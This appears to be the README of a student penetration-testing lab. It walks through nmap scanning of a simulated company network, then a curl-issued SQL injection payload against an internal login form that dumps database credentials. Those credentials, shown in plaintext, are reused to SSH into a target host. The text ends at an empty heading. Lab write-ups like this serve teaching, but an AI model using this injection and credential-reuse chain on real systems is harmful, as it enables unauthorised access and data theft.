# NetworkSecurity-Project

Network Security project about SSH, Database and SQL Injection.

# Network Scheme

<img src="https://raw.githubusercontent.com/Tony177/NetworkSecurity-Project/main/Image/network_scheme.svg" width=500>

-   Web Network
    1. Web Server hosting a stub site using NodeJS
    2. MySQL Server hosting sensitive information
-   Employee Network
    1. BobPC which represent the hacker host
    2. TomPC which represent the target host
-   Company Network
    1. All the Employee network
    2. Web Server

# Background Scenario

This lab is about a industrial espionage, represented by Bob, who is infiltrated inside a company lan network and found, among a lot of other devices, one vulnerable computer that belongs to Tom and an useful site open ONLY inside the company network.

During the demostration scenario we found out these IP:

-   _172.19.0.1_ - Company Network
-   _172.19.0.2_ - Bob PC on company network
-   _172.19.0.3_ - Tom PC on company network
-   _172.19.0.4_ - Web Server on company network
-   _172.20.0.1_ - Employee Network
-   _172.20.0.2_ - Bob PC on employee network
-   _172.20.0.3_ - Tom PC on employee network

And we don't have any access to the Web network

# Instruction: what to do

You can start connecting to the pentesting PC with SSH using 2222 port

1. Footprinting: gather information online about the organization
2. Scanning: scan vulnerable point of access
3. Enumeration: probing more intrusive of vulnerable services
4. Exploitation: attacking those potential vulnerability

## Footprinting

In this case scenario we're already connected to the local network, so we've already gathered enought information about our target

## Scanning

We start find out our IP address on the networks using `ifconfig` command, and we found out.

Using then `nmap` tool with these options:

-   “-sn” means “no port scan”
-   “-PE” sends ICMP Echo Request
-   “--send-ip” to not send ARP packets

We found out some host IP:

**_Company Network_**

<img src="https://github.com/Tony177/NetworkSecurity-Project/raw/main/Image/company_network.png" width=500>

**_Employee Network_**

<img src="https://github.com/Tony177/NetworkSecurity-Project/raw/main/Image/employee_network.png" width=500>

## Enumeration

We're interested in the Web Server and in Tom PC, so we can scan more aggressively to find about any open port

If we use simply a TPC SYN scan from nmap, we find vague information:

<img src="https://raw.githubusercontent.com/Tony177/NetworkSecurity-Project/main/Image/webserver_ss.png" width=500>

Else, if we explore more with a Version Detection scan, we can scan even beyond the typical use of a port like 8080:

<img src="https://github.com/Tony177/NetworkSecurity-Project/raw/main/Image/webserver_sv.png" width=500>

and we find about a web server open on port 8080.

Meanwhile on Tom PC we found an open SSH port

<img src="https://raw.githubusercontent.com/Tony177/NetworkSecurity-Project/main/Image/tom_sv.png" width=500>

We can think about SSH after getting information about the site.
Now we can find about this site (in a real case scenario we should use DirBuster to map the entire site) and the main page.

<img src="https://raw.githubusercontent.com/Tony177/NetworkSecurity-Project/main/Image/webserver_curl.png" width=500>

We retrived the html page using `curl` and found out about a login form, which we can try to exploit.

## Exploitation

We can try some usual combination for the form

```bash
curl -X POST -d 'username=a&password=b' 172.19.0.4:8080
```

Which returns "Error value(s) missing"

```bash
curl -X POST -d 'username=&password=b' 172.19.0.4:8080
```

Which returns

`{"success":false,"response":"No user found","result":[]}`

and we can try last one with MySQL injection using OR and commenting syntax

```bash
curl -X POST -d 'username=" OR 1<2; -- &password=b' 172.19.0.4:8080
```

which return us a bunch of credentials

<img src="https://github.com/Tony177/NetworkSecurity-Project/raw/main/Image/webserver_sql.png" width=500>

including only one user called Tom with:

```
username = tcasaccio1
password = YLN1NrMdGN
```

## SSH Access

Now that we gather those information, we can hope that the only user we know has the same user and password as this database.

We can try to log in using:

```bash
ssh tcasaccio1@172.20.0.3
```

# SQL Injection Procedure
